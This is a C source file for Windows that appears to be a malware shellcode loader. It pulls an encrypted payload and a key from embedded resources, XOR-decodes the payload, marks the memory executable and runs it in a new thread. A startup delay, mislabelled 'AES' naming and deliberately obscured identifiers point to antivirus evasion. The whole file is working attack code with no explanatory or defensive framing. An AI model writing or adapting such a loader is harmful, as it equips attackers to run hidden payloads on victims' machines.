#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void laddrems(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void xdecman(char* co1d, DWORD co1dlen, unsigned char* kesu, DWORD key1en) {
    for (DWORD masu = 0; masu < co1dlen; masu++) {
        co1d[masu] ^= kesu[masu % key1en]; 
    }
}


int main() {
    Sleep(2000);

    char* AESkey;
    DWORD AESkeyLen;
    laddrems("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    laddrems("AESCODE", &AESCode, &AESCodeLen);

    LPVOID memalo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);
    
    xdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);

    memcpy(memalo, AESCode, AESCodeLen);
    DWORD oldProtect;
    VirtualProtect(memalo, AESCodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)memalo, NULL, 0, NULL);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;
}
